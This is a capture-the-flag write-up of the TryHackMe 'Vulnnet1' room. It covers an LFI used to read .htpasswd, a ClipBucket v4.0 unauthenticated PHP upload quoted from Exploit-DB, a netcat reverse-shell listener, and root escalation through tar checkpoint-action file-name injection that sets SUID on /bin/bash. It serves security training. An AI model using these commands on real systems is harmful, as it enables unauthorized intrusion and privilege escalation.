---
title: THM Vulnnet1
author: hanhctf
date: 2023-04-06 22:22:22 +0700
categories: [Write-up, THM]
tags: [php]
toc: true
mermaid: true
---

# [**_Vulnnet1 room_**](https://tryhackme.com/room/vulnnet1)

## Nmap

With Nmap, see 2 ports open
![](/commons/THM/Vulnnet1/1.nmap.png)

## Analyz the webpage

***View the source of the home page, we see 2 Js files.***  
Check domain vulnnet.thm in them. We found something interesting.

1. Subdomain ```<http://broadcast.vulnnet.thm>```
2. A path URL `referer` ```http://vulnnet.thm/index.php?referer=``` ==> LFI

![](/commons/THM/Vulnnet1/2.LFI-vuln.png)  

## Foothold

With dirsearch, we found some files.   
![](/commons/THM/Vulnnet1/3.dirsearch.png)

==> Find credential in `/etc/apache2/.htpasswd`
![](/commons/THM/Vulnnet1/4.htpasswd.png)

Crack hash with JTR
![](/commons/THM/Vulnnet1/5.crack-hash.png)

With this credential of developers, we can access ```http://broadcast.vulnnet.thm```

webpage with title ClipBucket v4.0
Quick research in exploit-DB ==> [Exploit](https://www.exploit-db.com/exploits/44250)

```
2. Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the web server with no
authentication required.

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/photo_uploader.php"

Furthermore, this vulnerability is also available to authenticated users with
basic privileges:

$ curl --cookie "[--SNIP--]" -F
"coverPhoto=@valid-image-with-appended-phpcode.php"
"http://$HOST/edit_account.php?mode=avatar_bg"   
```

![](/commons/THM/Vulnnet1/6.file-upload.png)

In the terminal, we listen with `nc -nlvp 9001`
And browser ```<http://broadcast.vulnnet.thm/actions/><file_directory>/<filename>.php```

![](/commons/THM/Vulnnet1/7.www-data.png)

Upload `linpeas.sh` to the target machine.  
Run `linpeas.sh`, we found an interesting backup file.  
![](/commons/THM/Vulnnet1/8.svr-man-backup.png)

Download the file to attack the machine.
With JRT --> credential of server-management
![](/commons/THM/Vulnnet1/9.svr-man-cred.png)

**Got user.txt**

## Privilege escalation  

Run `linpeas.sh`, we see a cronjob with root user  
![](/commons/THM/Vulnnet1/10.cronjob.png)  
![](/commons/THM/Vulnnet1/11.code-cronjob.png)  

THIS PROGRAM IS MAKING A BACKUP USING THE **TAR** COMMAND OF THE Documents FOLDER
LETS CHECK GTFOBINS  

```shell
server-management@vulnnet:~/Documents$ echo "" > "--checkpoint-action=exec=sh pwn.sh"
server-management@vulnnet:~/Documents$ echo "" > --checkpoint=1
server-management@vulnnet:~/Documents$ echo "chmod +s /bin/bash" > pwn.sh  
```

![](/commons/THM/Vulnnet1/12.pwn.png)  

**Got root.txt**
